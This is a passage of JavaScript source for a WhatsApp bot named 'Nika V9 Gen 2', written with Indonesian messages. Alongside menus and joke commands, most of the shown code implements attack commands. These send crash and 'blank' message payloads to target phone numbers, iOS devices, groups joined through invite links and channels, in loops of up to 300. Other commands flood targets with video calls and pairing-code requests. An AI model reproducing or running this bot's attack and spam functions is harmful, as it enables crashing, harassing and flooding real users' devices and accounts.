  };

  await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break

case 'ownermenu': {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let menu = `张伟 hi, ${pushname} ${getGreeting()}, I'm Nika Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 

张伟 *NIKA V9 GEN 2*
[ ♢ ] Bot Information ♔
◎ Bot Name : Nika
◎ Creator : Depayy
◎ Version : 9.2.0 Vip!! 
◎ Runtime : ${runtime(process.uptime())} 
◎ Type : Case
◎ Prefix : multi

[ ♢ ] Owner Menu ♔
◇ .addmurbug
◇ .delmurbug
◇ .addowner
◇ .delowner
◇ .addmurbuggc
◇ .delmurbuggc
◇ .listmurbug
◇ .self
◇ .public
◇ .clearsession
`
let buttons = [
    {
    buttonId: '.menu',
    buttonText: {
      displayText: '◇'
      }
    }
  ];

  let buttonMessage = {
    image: { url: `https://files.catbox.moe/x6hgad.jpg` },
    caption: menu,
    footer: 'Nika V9 Gen 2',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363409362506610@newsletter",
        serverMessageId: null,
        newsletterName: `𝐍𝐈𝐊𝐀 𝐕𝟗 𝐆𝐄𝐍 𝟐`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break

case 'allmenu': {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let teksnya = `张伟 hi, ${pushname} ${getGreeting()}, I'm Nika Whatsapp bot designed and designed with JavaScript technology to help you, use me wisely 

张伟 *NIKA V9 GEN 2*
[ ♢ ] Bot Information ♔
◎ Bot Name : Nika
◎ Creator : Depayy
◎ Version : 9.2.0 Vip!! 
◎ Runtime : ${runtime(process.uptime())}
◎ Type : Case
◎ Prefix : multi

[ ♢ ] Bug Menu ♔
◇ .dep 628xxx [ Button Bug ]
◇ .invisible 628xxx
◇ .blanking 628xxx
◇ .delayhard 628xxx
◇ .comboblank 628xxx
◇ .delaycombo 628xxx
◇ .kill-ios 628xxx
◇ .crash-ios 628xxx

[ ♢ ] Bug Group ♔
◇ .blanking-group [ Link ]
◇ .delay-group [ Link ]
◇ .combobug-group [ Link ]

[ ♢ ] Bug Saluran ♔
◇ .bugch [ idch ]
◇ .crash-saluran [ idch ]

[ ♢ ] Spam Menu ♔
◇ .spampair 628xxx|50
◇ .spamcall 628xxxx

[ ♢ ] Owner Menu ♔
◇ .addmurbug
◇ .delmurbug
◇ .addowner
◇ .delowner
◇ .addmurbuggc
◇ .delmurbuggc
◇ .listmurbug
◇ .self
◇ .public
◇ .clearsession

[ ♢ ] Fun Menu ♔
◇ .r34
◇ .hentaineko
◇ .tourl 
◇ .rvo 
◇ .swm 
◇ .sticker 
◇ .qc 
◇ .brat
◇ .bratvid
◇ .pin 
◇ .cekidch 
◇ .cekidgc 
◇ .yts 
◇ .tiktok 
◇ .capcut 
◇ .reactch 
◇ .sertifikattolol
◇ .cekkhodam 
◇ .cekganteng
`
    let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "◇" } }
    ];

    let buttonMessage = {
        image: { url: `https://files.catbox.moe/iambv7.jpg` },        
        caption: teksnya,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `NIKA V9 GEN 2`,
                body: `© Depayy`,
                thumbnailUrl: `https://files.catbox.moe/caqc40.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: true, 
            }
        },
        footer: "© D-Nika",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "张伟",
                sections: [
                    {
                        title: "NIKA V9 GEN 2",
                        highlight_label: " ",
                        rows: [
                            { title: "DEVELOPER", description: "张伟", id: `.owner` },
                            { title: "THANKS TO", description: "张伟", id: `.tqto` }, 
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await depayy.sendMessage(m.chat, buttonMessage, { quoted: lol });  
   await depayy.sendMessage(m.chat, { audio: fs.readFileSync('./image/musik1.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: qtext });     
}
break;

case 'dep': {
if (!q) return payreply(`*wrong input, example dep 628xxxx!!!*`);
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return payreply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
global.jumlah = q.split("|")[1]
let teks = `𝐒𝐄𝐋𝐄𝐂𝐓 𝐁𝐔𝐓𝐓𝐎𝐍 𝐁𝐔𝐆`
  const bet = {
    title: "张伟",
    sections: [
      {
        title: `张伟`, 
        highlight_label: `© Depay ☀`,
        rows: [
          {
            title: "𝙄𝙉𝙑𝙄𝙎 𝙁𝙊𝙍 𝘼𝙉𝘿𝙍𝙊",
            description: "张伟",
            id: `.bugdepay ${pepec}`, 
          },
          {
            title: "𝐇𝐀𝐑𝐃 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄",
            description: "张伟",
            id: `.invis1 ${pepec}`, 
          },
          {
            title: "𝐂𝐑𝐀𝐒𝐇 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄",
            description: "张伟",
            id: `.invis2 ${pepec}`, 
          },
          {
            title: "𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐔𝐈",
            description: "张伟",
            id: `.invis3 ${pepec}`, 
          },
          {
            title: "𝐇𝐀𝐑𝐃 𝐂𝐎𝐌𝐁𝐎 𝐈𝐍𝐕𝐈𝐒",
            description: "张伟",
            id: `.invis4 ${pepec}`, 
          },
          {
            title: "𝐃𝐄𝐋𝐀𝐘 𝐇𝐀𝐑𝐃 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄",
            description: "张伟",
            id: `.invis5 ${pepec}`, 
          },
          {
            title: "𝐁𝐎𝐎𝐌 𝐈𝐍𝐕𝐈𝐒",
            description: "张伟",
            id: `.invis6 ${pepec}`, 
          },
        ]},
      {
        title: `𝘽𝙇𝘼𝙉𝙆 𝙁𝙊𝙍 𝘼𝙉𝘿𝙍𝙊`, 
        highlight_label: `© Depay ☀`,
        rows: [
          {
            title: "𝐁𝐋𝐀𝐍𝐊𝐈𝐍𝐆",
            description: "张伟",
            id: `.blank1 ${pepec}`, 
          },
          {
            title: "𝐇𝐀𝐑𝐃 𝐁𝐋𝐀𝐍𝐊",
            description: "张伟",
            id: `.blank2 ${pepec}`, 
          },
          {
            title: "𝐁𝐋𝐀𝐍𝐊-𝐂𝐋𝐈𝐂𝐊",
            description: "张伟",
            id: `.blank3 ${pepec}`, 
          },
        ]},
      {
        title: `𝘽𝙐𝙂 𝙁𝙊𝙍 𝙄𝙊𝙎`, 
        highlight_label: `© Depay ☀`,
        rows: [
          {
            title: "𝐂𝐑𝐀𝐒𝐇-𝐈𝐎𝐒",
            description: "张伟", 
            id: `bugios1 ${pepec}`,
          },
          {
            title: "𝐈𝐎𝐒-𝐂𝐑𝐀𝐒𝐇𝐂𝐇𝐀𝐓",
            description: "张伟",
            id: `bugios2 ${pepec}`, 
          },
          {
            title: "𝐈𝐏-𝐇𝐀𝐑𝐃𝐁𝐔𝐆",
            description: "张伟",
            id: `bugios3 ${pepec}`, 
          },
        ]},
      {
        title: `𝙎𝙋𝘼𝙈 𝘽𝙐𝙂`, 
        highlight_label: ``,
        rows: [
          {
            title: "𝐒𝐏𝐀𝐌 𝐂𝐀𝐋𝐋",
            description: "spam call", 
            id: `spamcall ${pepec}`,
          },
          {
            title: "𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑",
            description: "spam pair",
            id: `.spampair ${pepec}|100`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)
}
break

case "owner": {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/Nika1.jpg") }, { upload: depayy.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*DEVELOPER NIKA*`,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Depayy*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp Depay\",\"url\":\"https://wa.me/628982103547\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/DepayOffc\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Nika\",\"url\":\"https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: lol})
await depayy.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break

case "tqto": {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/Nika1.jpg") }, { upload: depayy.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*ThanksTo*`,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `\`ThanksTo\`
Depay [ Creator ]
Rafly [ AbangDepay ]
Riz [ Partner ]
Asep [ BestFriend ]
Nted [ BestFriend ]
Corza [ BestFriend ] 
Rapli [ BestFriend ] 
Raflie [ BestFriend ]
Wiz [ Partner ]
Yudz [ Partner ]
Zan [ Partner ]
kato [ Partner ]
All Partner 
All pengguna script
`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                 
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Nika\",\"url\":\"https://whatsapp.com/channel/0029Vb8yDHFAYlUJ2er9370V\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: lol})
await depayy.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break
//====================[ CASE BUG SALURAN ]===========================//
case 'crash-saluran': {
if (!isOwner) return;
if (!text) return depayy.sendMessage(m.chat, { text: "Masukkan ID newsletter!\nContoh: .ch id@newsletter" }, { quoted: m });
let newsletterId = text.trim(); 
await (async () => {
for (let r = 0; r < 20; r++) {
await CrashJids(newsletterId);
await VampCrashCH(newsletterId);
await order(newsletterId);
}
})();
depayy.sendMessage(m.chat, { text: `✅ Berhasil mengirim Bug ke ${newsletterId}.` }, { quoted: m });
break }

case 'bugch': {
if (!isOwner) return;
if (!text) return depayy.sendMessage(m.chat, { text: "Masukkan ID newsletter!\nContoh: .ch id@newsletter" }, { quoted: m });
let newsletterId = text.trim(); 
await (async () => {
for (let r = 0; r < 20; r++) {
await order(newsletterId);
await CrashJids(newsletterId);
await VampCrashCH(newsletterId);
}
})();
depayy.sendMessage(m.chat, { text: `✅ Berhasil mengirim Bug ke ${newsletterId} ` }, { quoted: m });
break }

//====================[ CASE BUG GROUP ]===========================//
case 'delay-group': {
    if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
    if (!text) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await depayy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await stcGc(isTarget)
            await stcGc(isTarget)
            await stcGc(isTarget)
            await stcGc(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await stcGc(isTarget)
            await VampireGroupInvis(isTarget)
            await stcGc(isTarget)
            await VampireGroupInvis(isTarget) 
        }
    }
}
break;

case 'blanking-group': {
    if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
    if (!text) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await depayy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await VampireBugIns(isTarget)
            await Blanking(isTarget)
            await VampireBugIns(isTarget)
            await Blanking(isTarget) 
            await VampireBugIns(isTarget)
            await Blanking(isTarget)
            await VampireBugIns(isTarget)
            await Blanking(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await VampireBugIns(isTarget)
            await Blanking(isTarget)
            await VampireBugIns(isTarget)
            await Blanking(isTarget) 
            await VampireBugIns(isTarget)
            await Blanking(isTarget)
            await VampireBugIns(isTarget)
            await Blanking(isTarget) 
        }
    }
}
break;

case 'combobug-group': {
    if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
    if (!text) return payreply(`*Example:*\n${prefix + command} https:// Atau 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return payreply('invalid group link');

        try {
            let isTarget = await depayy.groupAcceptInvite(groupId);
            payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink} (Group ID: ${groupId})`);

            for (let r = 0; r < 300; r++) {
            await VampireGroupInvis(isTarget)
            await stcGc(isTarget)
            await VampireBugIns(isTarget)
            await VampireGroupInvis(isTarget) 
           }
        } catch (err) {
            return payreply(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let isTarget = groupLink;
        payreply(`Sukses! ${command} Mengirimkan Virus Kedalam Grup: ${groupLink}`);

        for (let r = 0; r < 300; r++) {
            await VampireGroupInvis(isTarget)
            await stcGc(isTarget)
            await Blanking(isTarget)
            await VampireBugIns(isTarget) 
            await VampireGroupInvis(isTarget)
            await stcGc(isTarget)
            await VampireGroupInvis(isTarget)
            await VampireBugIns(isTarget) 
        }
    }
}
break;

//====================[ CASE BUG ]===========================//
case 'bugios1':
case 'bugios2':
case 'bugios3':
case 'crash-ios': 
case 'kill-ios': { // BUG HARD
if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
if (!q) {
payreply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = nomordepay;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return payreply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let typebug = "Delay Hard"
let done = `𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 ${pepec}
`
if (target === blockedNum) {
	reply('bro mencoba ngebug developer🐭');
	} else {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}), 
await sleep(2500)
		try{

{
VampKilliPhone(target);
VampKilliPhone(target);
}
 await consolebug(pepec, command, typebug);               
 depayy.sendMessage(m.chat, { react: { text: "✅",key: m.key,}});
  depayy.sendMessage(m.chat, {
  image: yuda,
  caption: done,
  footer: '© D-NIKA V9 GEN 2',
  buttons: [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Developer' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: lol });
            
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

case 'blank3':
case 'blank2': 
case 'comboblank': { // BUG HARD
if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
if (!q) {
payreply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = nomordepay;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return payreply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let typebug = "Delay Hard"
let done = `𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 ${pepec}
`
if (target === blockedNum) {
	reply('bro mencoba ngebug developer🐭');
	} else {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}), 
await sleep(2500)
		try{

{
depayblanknew(target);
depayyblank(target);
depayblanknew(target);
}
 await consolebug(pepec, command, typebug);               
 depayy.sendMessage(m.chat, { react: { text: "✅",key: m.key,}});
  depayy.sendMessage(m.chat, {
  image: yuda,
  caption: done,
  footer: '© D-NIKA V9 GEN 2',
  buttons: [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Developer' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: lol });
            
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

case 'blank1':
case 'blanking': { // BUG HARD
if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
if (!q) {
payreply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = nomordepay;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return payreply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let typebug = "Delay Hard"
let done = `𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 ${pepec}
`
if (target === blockedNum) {
	reply('bro mencoba ngebug developer🐭');
	} else {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}), 
await sleep(2500)
		try{

{
depayyblank(target);
depayblanknew(target)
}
 await consolebug(pepec, command, typebug);               
 depayy.sendMessage(m.chat, { react: { text: "✅",key: m.key,}});
  depayy.sendMessage(m.chat, {
  image: yuda,
  caption: done,
  footer: '© D-NIKA V9 GEN 2',
  buttons: [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Developer' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: lol });
            
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

case 'invis4':
case 'invis3':
case 'invis3':
case 'invisible': { // BUG HARD
if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
if (!q) {
payreply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = nomordepay;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return payreply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let typebug = "Delay Hard"
let done = `𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 ${pepec}
`
if (target === blockedNum) {
	reply('bro mencoba ngebug developer🐭');
	} else {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}), 
await sleep(2500)
		try{

{
depayynew1(target);
depayynew1(target);
}
 await consolebug(pepec, command, typebug);               
 depayy.sendMessage(m.chat, { react: { text: "✅",key: m.key,}});
  depayy.sendMessage(m.chat, {
  image: yuda,
  caption: done,
  footer: '© D-NIKA V9 GEN 2',
  buttons: [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Developer' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: lol });
            
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

case 'invis6':
case 'invis5':
case 'delaycombo':
case 'delayhard': { // BUG HARD
if (!isPremium && !isOwner && !isUnli) return payreply(`Khusus Owner`);
if (!q) {
payreply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = nomordepay;
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return payreply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
let typebug = "Delay Hard"
let done = `𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 𝐓𝐚𝐫𝐠𝐞𝐭 ${pepec}
`
if (target === blockedNum) {
	reply('bro mencoba ngebug developer🐭');
	} else {
await depayy.sendMessage(m.chat, { react: { text: "☀",key: m.key,}}), 
await sleep(2500)
		try{

{
depayynew2(target);
depayynew1(target);
}
 await consolebug(pepec, command, typebug);               
 depayy.sendMessage(m.chat, { react: { text: "✅",key: m.key,}});
  depayy.sendMessage(m.chat, {
  image: yuda,
  caption: done,
  footer: '© D-NIKA V9 GEN 2',
  buttons: [
  {
    buttonId: ".owner", 
    buttonText: { 
      displayText: 'Developer' 
    }
  }
],
  viewOnce: true,
  headerType: 6,
}, { quoted: lol });
            
} catch (err) {
    console.erorr(err);
    }
}
}
    }
break

//BUG IN PLACE
case 'out': {
   if (!m.isGroup) return xreplybugbutton('Khusus Bug Grup!!!')
   if (!isOwner) return xreplybugbutton(`*Can only be used in bot numbers*`)   
    payreply(`*Succes*`)
    {    
    await VampireBugIns(m.chat);
    await VampireBugIns(m.chat);
    await VampireBugIns(m.chat);
    await VampireBugIns(m.chat);
    await VampireBugIns(m.chat);
    await VampireBugIns(m.chat);
    await VampireBugIns(m.chat);
    await VampireBugIns(m.chat);
        }
    }
                break     


//SPAM CALL                                
async function sendOfferVideoCall(target) {
    try {
        await depayy.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
      
 case 'stelp':          
 case 'spamtelp': { // SPAM TELP
if (!isOwner && !isPremium && !isUnli) return buttonpayreply(`Fitur ini Khusus Owner`) 
if (!q) {
buttonpayreply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = '6283891457614@s.whatsapp.net';
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return buttonpayreply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
if (target === blockedNum) {
	xreplybugbutton('*Developernya seleb kocak, gabakal diangkat telp gw👺*');
	} else {
await depayy.sendMessage(m.chat, { react: { text: "📲",key: m.key,}}),
await sleep(1500)
await depayy.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}}); 
            buttonpayreply(`*Succes spam call to target ${pepec}*`) 
            depayy.sendMessage(target, {text: `halo mass`});
for (let i = 0; i < 100; i++) {
sendOfferVideoCall(target)

await sleep(2000)
}            
 depayy.sendMessage(target, {text: `halo mass`});
}
}
    }
break   

//SPAM PAIR
case 'spampair': {
if (!isOwner) return buttonpayreply(`Fitur ini Khusus Owner`) 
if (!text) return buttonpayreply(`*Example:* ${prefix + command} +628xxxxxx|150`)
buttonpayreply('proses...')
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
    
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
case "cekganteng": {
if (!args[0]) return payreply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
payreply(teks)
}
break         

case 'cekkhodam': case 'cekkodam': {
if (!text) return payreply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"pecel lele",
"kumis lele",
"Ambatron",
"Ambatukam",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Ternyata Khodam ${text} adalah:* ${kdm}`
  payreply(kodamn)
}
break  

        case 'addmurbuggc':

if (!isOwner) return 
if (!m.isGroup) return buttonpayreply("Lakukan Didalem Grup!")
if (!isOwner) return buttonpayreply("Fitur owner")
unli.push(m.chat)
fs.writeFileSync('./database/unli.json', JSON.stringify(unli))
buttonpayreply(`Seluruh Member Grup, Sudah Dapat Mengakses Bot Nika!`)
break
case "delmurbuggc":{
  
if (!m.isGroup) return buttonpayreply("Lakukan Didalam Grup!")
if (!isOwner) return buttonpayreply("Fitur owner")
unli.splice(m.chat)
fs.writeFileSync("./database/unli.json", JSON.stringify(unli))
xreplybugbutton(`Seluruh Member Grup Kini Tidak Dapat Mengakses Bot, Silahkan Chat Owner Bot Untuk Membeli Akses!`)
}
break

      case "reactch":
      case "spamreact": {
